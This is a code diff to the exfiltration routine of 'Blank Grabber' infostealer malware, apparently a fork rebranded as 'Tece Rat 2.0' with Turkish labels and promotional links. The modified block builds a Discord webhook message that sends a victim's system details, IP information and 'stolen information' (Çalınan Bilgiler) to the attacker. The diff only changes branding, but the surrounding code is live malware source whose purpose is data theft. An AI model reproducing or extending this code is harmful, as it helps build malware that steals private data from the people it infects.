@@ -1678,25 +1678,25 @@ class BlankGrabber:
 
         match Settings.C2[0]:
             case 0: # Discord Webhook
-                image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
+                image_url = "https://cdn.discordapp.com/attachments/1069742464333791363/1399051952561848473/sadecegayleriitakipediyorum-CPLSDk5nnD5.mp4?ex=68d214ea&is=68d0c36a&hm=c50545c22eb511ad8d7c516ed11e4eda80872fda2f56a96e9c58daac6ae7bac9&"
 
                 payload = {
                     "content": "||@everyone||" if Settings.PingMe else "",
                     "embeds": [
                         {
-                            "title": "Blank Grabber",
-                            "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
+                            "title": "Tece Rat 2.0",
+                            "description": f"**__Sistem Bilgileri__\n```autohotkey\n{system_info}```\n__IP Adresi__```prolog\n{ipinfo}```\n__Çalınan Bilgiler__```js\n{grabbedInfo}```**",
                             "url": "https://github.com/Blank-c/Blank-Grabber",
                             "color": 34303,
                             "footer": {
-                                "text": "tece rat       Coder : Darkzuq  :)  "
+                                "text": "discord.gg/tece youtube.com/darkzuq  Coder : Darkzuq  :)  "
                             },
                             "thumbnail": {
                                 "url": image_url
                             }
                         }
                     ],
-                    "username" : "Blank Grabber",
+                    "username" : "Tece 2.0",
                     "avatar_url" : image_url
                 }
 
